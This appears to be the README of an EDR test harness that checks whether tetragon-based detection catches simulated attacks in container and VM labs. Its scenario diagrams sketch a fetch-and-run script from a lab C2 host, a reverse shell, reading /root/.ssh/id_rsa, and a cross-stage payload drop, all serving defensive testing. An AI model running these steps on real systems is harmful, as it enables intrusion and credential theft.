# SysArmor 测试环境

两种独立拓扑(容器 / VM),验证 EDR 采集能**跨 namespace 和终端类型**工作:
同一套 TracingPolicy,不管 endpoint 是容器还是 VM,tetragon 都产出结构一致的 Event。

## 拓扑

```
容器拓扑 (docker compose)               VM 拓扑 (Vagrant + libvirt)
┌──────────────────────────────┐        ┌──────────┐ ┌──────────┐ ┌──────────┐
│ 宿主机内核                    │        │ attacker │ │  node-a  │ │   mgr    │
│  └─ Docker: sysarmor-net     │        │  VM(C2)  │ │ +tetragon│ │   VM     │
│      ├─ attacker  .99        │        │  独立内核  │ │  独立内核 │ │  独立内核 │
│      ├─ node-a    .11        │        └──────────┘ └──────────┘ └──────────┘
│      ├─ mgr       .10        │
│      └─ tetragon (eBPF 传感器)│        tetragon 在 VM 内核上直装
│                               │
│ tetragon 共享宿主内核          │        不需要 Docker
└──────────────────────────────┘
```

## 场景设计

每个场景是一份**契约**:给定攻击输入,系统必须(或不)产出指定的 Event/Signal/Incident。

| 场景 | ATT&CK | 核心命题 | Incident |
|---|---|---|---|
| **apt-fileless-c2** | T1190→T1059→T1105→T1571 | "响"的攻击:端侧产 terminal,云端缝合 | =1 |
| **apt-staged-drop** | T1105+T1574 | 云端图立论:跨 lineage,端侧无 terminal | =1 |
| **benign-ci-noise** | 误报基准 | 罕见度≠裸加:良性 CI 不产 Incident | =0 |

三场景构成最小完备集:正向(有攻击应检出)+ 横向(跨 lineage) + 负向(无攻击不误报)。

### apt-fileless-c2 (Log4Shell 风格)

```
java-web → bash → curl 10.66.0.99:8080/x.sh → bash /dev/shm/x.sh
                                                    ↓
                                              反弹 shell → 10.66.0.99:443
                                              后渗透: cat /root/.ssh/id_rsa
```

端侧单 lineage 内形成完整攻击链,产 terminal Signal。云端缝合成 Incident。
契约要点:端侧必须产 terminal,Incident=1,证据子图包含 bash→x.sh→C2 路径。

### apt-staged-drop (跨 lineage 分阶段)

```
lineage A (CI 构建): curl → 10.66.0.99:8080/helper → /var/lib/app/plugins/helper
                     ──── 间隔 GAP 秒 ────
lineage B (应用加载): /var/lib/app/plugins/helper --report 10.66.0.99:443
```

落盘与执行分属不同 lineage,端侧任一 lineage 都不产 terminal。
只有云端 provenance graph 通过共享文件节点 `/var/lib/app/plugins/helper` 缝合,才能成案。
契约要点:端侧无 terminal,Incident=1,lineage_ids≥2,证据子图含 helper 节点。control:关闭 cross_lineage 则 Incident=0。

### benign-ci-noise (良性 CI 噪音)

```
CI 构建 ×N 轮: curl → 10.66.0.99:8080 (拉依赖) → 编译 → 写 artifact
```

行为模式与攻击高度相似(curl 外联+文件写入+执行),但完全合法。
核心断言:Incident=0 (罕见度+结构收敛不误报)。
control:切换为 additive_threshold 则误报(Incident≥1),证明裸加是反模式。

## 目录结构

```
test/
├── Makefile                 e2e 入口
│
├── env/                     搭建:拓扑定义 + 镜像 + 资源
│   ├── container/
│   │   ├── compose.yaml      容器拓扑声明
│   │   └── images/           Dockerfile (attacker / node-a / mgr)
│   ├── vm/
│   │   ├── Vagrantfile       VM 拓扑声明
│   │   └── provision/        install-tetragon / setup-c2 / setup-credentials
│   └── resources/            共享资源
│       ├── syscall-capture.yaml   TracingPolicy (唯一真正执行的 policy)
│       └── registry-token         假凭据
│
├── scenarios/               执行:攻击脚本 + 期望契约
│   ├── container/            容器拓扑场景 (docker exec 触发)
│   └── vm/                   VM 拓扑场景 (vagrant ssh 触发)
│
├── policies/                PolicyEnvelope 契约 (agent 配置,待接入)
│
├── harness/                 编排:start / stop / capture / assert / report
│
└── .results/                抓包样本
```

一句话:
- **env/** = 搭环境(搭完不动)
- **scenarios/** = 跑什么(攻击输入+断言)
- **policies/** = agent 契约(待接入)
- **harness/** = 怎么跑(生命周期+采集+判对错)

## 快速开始

```bash
# 容器拓扑
make up                              # docker compose up + 加载 TracingPolicy
make capture SCENARIO=apt-fileless-c2
make down

# VM 拓扑
make up TOPO=vm
make capture TOPO=vm SCENARIO=apt-fileless-c2
make down TOPO=vm

# 一键
make e2e                             # up + capture
make e2e TOPO=vm SCENARIO=apt-staged-drop

# 清理
make clean                           # down + 删 .results/
```

## 前提

| 拓扑 | 需要 |
|---|---|
| 容器 | Docker Compose v2 |
| VM | libvirt + vagrant-libvirt |

## 注意事项

- 容器镜像源:`docker.1panel.live`(实测可用);`docker.1ms.run` 坏的。
- 容器内 apt 源需 sed 为 `mirrors.edge.kernel.org` + 关 https 校验。
- VM tetragon 从 GitHub release 下载 tarball;VM 内 GitHub 被墙时需手动下载。
- 容器拓扑 tetragon `--pid=host`,当前靠 TracingPolicy selector 过滤噪音;后续可加 `--cgroup-filter`。
- VM 拓扑修改脚本后需 `make provision`(rsync + re-provision)。
